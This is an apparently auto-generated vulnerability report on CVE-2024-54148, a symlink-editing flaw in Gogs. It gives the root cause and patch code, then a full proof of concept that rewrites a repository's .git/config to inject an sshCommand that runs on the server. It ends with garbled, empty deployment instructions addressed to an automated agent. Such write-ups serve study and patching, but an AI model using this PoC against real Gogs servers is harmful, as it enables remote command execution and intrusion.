"# CVE-2024-54148 Detailed Report\n\n## Summary of the CVE\nCVE-2024-54148 is a critical vulnerability found in Gogs, an open-source self-hosted Git service. The vulnerability allows a malicious user to exploit the file editing capabilities of the Gogs web interface to create and edit symbolic link (symlink) files within a repository. By doing so, the attacker can gain unauthorized SSH access to the server. The affected version of Gogs is v0.13.1-rc.1, and the vulnerability has been patched in version 0.13.1.\n\n### Vulnerability Type (CWE)\n- **CWE-61**: UNIX Symbolic Link (Symlink) Following\n- **CWE-22**: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\n\n## Root Cause of the Vulnerability\nThe root cause of CVE-2024-54148 lies in the improper handling of symbolic links within the file editing functionality of Gogs. Specifically, the application did not adequately restrict the editing of symlink files, allowing users to create symlinks that pointed to sensitive files on the server. \n\n### Code Analysis\nThe provided patch indicates that the vulnerability was addressed by adding checks to prevent the editing of symlink files. The relevant code changes in `internal/route/repo/editor.go` include:\n\n```go\n// ğŸš¨ SECURITY: Do not allow editing if the target file is a symlink.\nif entry.IsSymlink() {\n    c.FormErr(\"TreePath\")\n    c.RenderWithErr(c.Tr(\"repo.editor.file_is_a_symlink\", part), tmplEditorEdit, &f)\n    return\n}\n```\n\nThis code snippet shows that the application now checks if the file being edited is a symlink and prevents the operation if it is. The lack of this check in previous versions allowed attackers to exploit the symlink functionality to gain unauthorized access.\n\n## Exploitation Details\nTo exploit this vulnerability, an attacker would need to follow these steps:\n\n1. Create two repositories in Gogs.\n2. Upload a file to the first repository.\n3. In the second repository, create a symbolic link to the file in the first repository.\n4. Commit and push the changes to the second repository.\n5. Edit the symbolic link file through the Gogs web interface, changing its content to include malicious SSH commands.\n6. Upon committing the changes, the malicious commands would be executed on the server, potentially leading to unauthorized access.\n\n## Environment Setup Requirements\n- **Port**: 3000 (default port for Gogs)\n- **Target Endpoint**: `/repo/editor` (the endpoint for editing files in a repository)\n- **Explicit Configuration**: No specific flags or environment variables were mentioned in the advisory.\n\n## Complete PoC Code\nThe proof-of-concept code provided in the advisory is as follows:\n\n```bash\n# Create two repositories, upload something to the first repository, edit any file, and save it on the webpage.\n# In the second repository, create a symbolic link to the file you need to edit:\n$ ln -s /data/gogs/data/tmp/local-repo/1/.git/config test\n$ ls -la\ntotal 8\ndrwxr-xr-x   5 dd  staff  160 Oct 27 19:09 .\ndrwxr-xr-x   4 dd  staff  128 Oct 27 19:06 ..\ndrwxr-xr-x  12 dd  staff  384 Oct 27 19:09 .git\n-rw-r--r--   1 dd  staff   12 Oct 27 19:06 README.md\nlrwxr-xr-x   1 dd  staff   44 Oct 27 19:09 test -> /data/gogs/data/tmp/local-repo/1/.git/config\n$ git add .\n$ git commit -m 'ddd'\n$ git push -f\n\n# Go back to the webpage, edit the symbolic file in the second repository, with the following content, change the filename, and save (here you can notice, with filename changed the symbolic file edit limit is bypassed)\n[core]\nrepositoryformatversion = 0\nfilemode = true\nbare = false\nlogallrefupdates = true\nignorecase = true\nprecomposeunicode = true\nsshCommand = echo pwnned > /tmp/poc\n[remote \"origin\"]\nurl = git@github.com:torvalds/linux.git\nfetch = +refs/heads/*:refs/remotes/origin/*\n[branch \"master\"]\nremote = origin\nmerge = refs/heads/master\n\n# Go back to the first repo, edit something, and commit again, you can notice a file called /tmp/poc created on the server.\n```\n\nThis PoC demonstrates how an attacker can leverage the vulnerability to execute arbitrary commands on the server by manipulating symlink files.\n\n## ğŸš€ DEPLOYMENT STRATEGY (USE THIS - DO NOT GUESS!)\n\n**Repository URL**: https://github.com/gogs/gogs\n**Platform**: N/A\n**Language**: None\n**Build Tool**: None\n\n### Build Commands:\n```bash\n\n```\n\n### Start Commands:\n```bash\n\n```\n\n### Deployment Notes:\nä» GitHub æºç éƒ¨ç½²ã€‚è¯­è¨€: æœªçŸ¥, æ„å»ºå·¥å…·: æœªçŸ¥\n\nâš ï¸ **CRITICAL INSTRUCTIONS**:\n1. DO NOT try to find Docker images or guess repository URLs\n2. USE THE REPOSITORY URL PROVIDED ABOVE\n3. Clone from the specified repository and follow build/start commands\n4. If build commands fail, analyze error and adapt (but keep using the same repo)\n"